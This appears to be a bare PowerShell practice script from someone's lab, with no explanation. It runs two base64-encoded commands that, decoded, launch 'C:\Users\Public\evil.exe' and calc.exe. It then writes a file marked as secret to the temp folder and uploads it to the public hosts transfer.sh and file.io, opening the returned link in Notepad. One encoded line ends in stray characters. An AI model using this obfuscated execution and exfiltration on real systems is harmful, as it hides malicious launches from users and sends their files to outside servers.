powershell -enc UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACcAQwA6AFwAVQBzAGUAcgBzAFwAUAB1AGIAbABpAGMAXABlAHYAaQBsAC4AZQB4AGUAJwA=
powershell -enc UwB0AGEAcgB0AC0AUABSAE8AQwBFAFMAUwAgACcAYwBhAGwAYwAuAGUAeABlACcA$$

$path = "$env:TEMP\important.txt"

Set-Content -Path $path -Value "Top secret info from Zakariae's lab"

Invoke-RestMethod -Uri "https://transfer.sh/important.txt" -Method Put -InFile $path -OutFile "$env:TEMP\url.txt"

Start-Process notepad.exe "$env:TEMP\url.txt"




$response = Invoke-RestMethod -Uri "https://file.io" -Method Post -InFile $path -ContentType "multipart/form-data"

$response.link | Out-File "$env:TEMP\url.txt"

Start-Process notepad.exe "$env:TEMP\url.txt"
